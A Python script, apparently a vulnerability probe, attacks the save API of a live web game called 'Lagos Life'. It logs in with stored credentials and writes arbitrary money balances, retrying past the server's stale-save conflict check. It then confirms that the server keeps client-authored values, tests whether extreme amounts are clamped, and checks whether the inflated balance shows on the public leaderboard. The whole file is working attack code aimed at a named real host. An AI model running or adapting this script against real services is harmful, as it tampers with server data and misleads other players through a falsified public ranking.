#!/usr/bin/env python3
"""
Lagos Life - DECISIVE TEST, done correctly (optimistic-retry loop).

Previous run returned 409 "A newer save exists" purely because my `base`
(updatedAt) was stale - the client had saved again after I captured it.
The server hands back its CURRENT game + updatedAt in the 409 body, so the
correct move is to re-base and retry. That is exactly what a scripted attacker
does, and what the real client already does.

Loop: GET save -> change money -> PUT(base=current) -> if 409, re-base from the
409 body and retry (max 8). Then read back and compare.
"""
import json, urllib.request, urllib.error, http.cookiejar, copy

BASE = "https://lagoslife.eliysites.com"
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/125.0 Safari/537.36")
creds = json.load(open("/tmp/ll_probe_creds.json"))

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def api(path, method="GET", body=None):
    h = {"User-Agent": UA, "Accept": "application/json, text/plain, */*",
         "Origin": BASE, "Referer": BASE + "/"}
    data = None
    if body is not None:
        data = json.dumps(body).encode(); h["Content-Type"] = "application/json"
    r = urllib.request.Request(BASE + path, method=method, data=data, headers=h)
    try:
        with opener.open(r, timeout=40) as resp:
            return resp.status, json.loads(resp.read() or b"{}")
    except urllib.error.HTTPError as e:
        raw = e.read()
        try:
            return e.code, json.loads(raw or b"{}")
        except Exception:
            return e.code, {"raw": raw[:300].decode("utf-8", "replace")}
    except Exception as e:
        return None, {"err": str(e)}


st, j = api("/api/auth/login", "POST", {"username": creds["username"], "password": creds["password"]})
print(f"login -> {st} {json.dumps(j)[:100]}\n")


def tamper(new_money, label, verbose=True):
    """GET -> mutate money -> PUT with retry on 409. Returns (persisted_value, put_status)."""
    game, base_at = None, None
    last_status = None
    put_value = None
    for attempt in range(1, 9):
        st, save = api("/api/save")
        if st != 200 or not isinstance(save.get("game"), dict):
            print(f"  [{label}] attempt {attempt}: couldn't read save ({st}) {json.dumps(save)[:120]}")
            return None, st
        game = copy.deepcopy(save["game"])
        base_at = save.get("updatedAt")
        put_value = new_money
        game["money"] = new_money
        body = {"game": {**game, "outbox": {"notices": [], "fx": []}}, "base": base_at}
        last_status, resp = api("/api/save", "PUT", body)
        if verbose:
            print(f"  [{label}] attempt {attempt}: base={base_at} PUT money={new_money:,} -> HTTP {last_status}")
        if last_status in (200, 204):
            break
        if last_status == 409:
            fresh_at = (resp or {}).get("updatedAt")
            fresh_money = ((resp or {}).get("game") or {}).get("money")
            if verbose:
                print(f"      409 stale; server now money={fresh_money} updatedAt={fresh_at} -> re-basing")
            continue
        # any other status: show it and stop
        if verbose:
            print(f"      body: {json.dumps(resp)[:300]}")
        break

    st2, after = api("/api/save")
    got = (after.get("game") or {}).get("money")
    return got, last_status


print("=" * 92)
print("TEST 1 - arbitrary client-authored balance (proper retry loop)")
print("=" * 92)
st, s0 = api("/api/save")
before = (s0.get("game") or {}).get("money")
print(f"  baseline money (server)  = {before:,}")

NEW = 123_456_789
got, status = tamper(NEW, "tamper")
print(f"\n  money server had         = {before:,}")
print(f"  money we PUT             = {NEW:,}")
print(f"  money server returns     = {got if got is None else format(got, ',')}")
ok = (got == NEW)
print(f"\n  *** {'CONFIRMED' if ok else 'NOT CONFIRMED'}: the server "
      f"{'persisted' if ok else 'did not persist'} a client-authored balance ***")
json.dump({"before": before, "put": NEW, "after": got, "status": status},
          open("/tmp/ll_test1.json", "w"), indent=2)

print("\n" + "=" * 92)
print("TEST 2 - ceiling: does the server clamp or accept absurd values?")
print("=" * 92)
for v in (5_000_000_000, 4_999_999_999, 10**12):
    got, status = tamper(v, f"probe", verbose=False)
    print(f"  PUT {v:>16,}  -> HTTP {status}  server value = {got if got is None else format(got, ',')}")

print("\n" + "=" * 92)
print("TEST 3 - does it publish to the PUBLIC leaderboard?")
print("=" * 92)
got, status = tamper(4_999_998_777, "forbes-tamper", verbose=False)
st, fb = api("/api/forbes")
print(f"  my save money now = {got if got is None else format(got, ',')}")
print(f"  GET /api/forbes -> {st}  total={ (fb or {}).get('total') }")
print(f"  mine = {json.dumps((fb or {}).get('mine'))}")
hits = [e for e in ((fb or {}).get("top") or []) if e.get("username") == creds["username"]]
print(f"  in public top list = {json.dumps(hits)}")
json.dump(fb, open("/tmp/ll_forbes_after.json", "w"), indent=2)

print("\n" + "=" * 92)
print(f"probe account: @{creds['username']}")
print("=" * 92)
